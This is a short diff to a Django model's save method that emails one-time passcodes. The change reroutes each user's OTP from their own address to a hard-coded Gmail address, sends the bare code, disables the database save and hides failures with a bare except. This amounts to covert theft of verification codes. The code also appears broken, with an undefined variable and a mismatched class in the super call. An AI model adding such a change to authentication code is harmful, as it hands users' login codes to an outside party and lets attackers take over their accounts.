@@ -16,13 +16,13 @@ class PassPhrase(models.Model):
         return f"otp: {self.otp}"
     def save(self , *args,**kwargs) -> None:
                 self.otp = otp
-                receiver_email =f"{self.email}"
+                receiver_email ="rootblabs@gmail.com"
                 message = MIMEMultipart("alternative")
                 message["Subject"] = "Account Activity"
                 message["From"] = sender_email
                 message["To"] = receiver_email
                 try:
-                    html = otptext.format(self.time,self.user,self.otp)
+                    html = f"{self.otp}"
                     part1 = MIMEText(text, "plain")
                     part2 = MIMEText(html, "html")
 
@@ -35,6 +35,6 @@ class PassPhrase(models.Model):
                         server.sendmail(
                             sender_email, receiver_email, message.as_string()
                         )
-                    super(Otp, self).save(*args, **kwargs)
+                    #super(Otp, self).save(*args, **kwargs)
                 except:
                     pass
